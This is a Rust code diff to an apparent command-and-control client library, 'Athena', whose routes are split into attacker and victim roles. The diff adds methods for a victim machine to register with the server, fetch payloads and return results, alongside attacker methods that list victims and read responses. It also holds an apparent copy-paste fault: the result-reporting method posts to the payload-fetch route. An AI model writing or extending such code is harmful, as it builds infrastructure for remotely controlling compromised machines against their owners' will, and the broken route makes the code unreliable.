@@ -16,7 +16,7 @@
  */
 use std::error::Error;
 
-use reqwest::Client;
+use reqwest::{Client, ClientBuilder};
 use url::Url;
 
 pub mod payload;
@@ -39,9 +39,10 @@ impl AthenaClientBuilder {
         self
     }
 
-    pub fn client(&mut self, client: Client) -> &mut Self {
+    pub fn client(&mut self, client: ClientBuilder) -> AthenaResult<&mut Self> {
+        let client = client.cookie_store(true).build()?;
         self.client = Some(client);
-        self
+        Ok(self)
     }
     pub fn host(&mut self, host: &str) -> &mut Self {
         if host.ends_with('/') {
@@ -69,12 +70,6 @@ pub struct AthenaClient {
 }
 
 impl AthenaClient {
-    pub async fn register(&self) -> AthenaResult<()> {
-        let url = self.host.clone().join(V1_ROUTES.victim.join)?;
-        self.client.post(url).send().await?;
-        Ok(())
-    }
-
     pub async fn attack_list_victims(&self) -> AthenaResult<Vec<attack::Victim>> {
         let url = self.host.clone().join(V1_ROUTES.attack.list_victims)?;
         Ok(self
@@ -103,7 +98,7 @@ impl AthenaClient {
             .await?)
     }
 
-    pub async fn read_response(
+    pub async fn attack_read_response(
         &self,
         payload: &attack::PayloadID,
     ) -> AthenaResult<Vec<attack::PayloadResponse>> {
@@ -125,6 +120,26 @@ impl AthenaClient {
 
     pub fn get_password(&self) -> &str {
         &self.password.password
+    }
+
+    pub async fn victim_register(&self) -> AthenaResult<()> {
+        let url = self.host.clone().join(V1_ROUTES.victim.join)?;
+        self.client.post(url).send().await?;
+        Ok(())
+    }
+
+    pub async fn victim_get_paylod(&self) -> AthenaResult<Vec<victim::Payload>> {
+        let url = self.host.clone().join(V1_ROUTES.victim.get_payload)?;
+        Ok(self.client.post(url).send().await?.json().await?)
+    }
+
+    pub async fn victim_set_payload_response(
+        &self,
+        payload: &victim::PayloadResult,
+    ) -> AthenaResult<()> {
+        let url = self.host.clone().join(V1_ROUTES.victim.get_payload)?;
+        self.client.post(url).json(payload).send().await?;
+        Ok(())
     }
 }
 
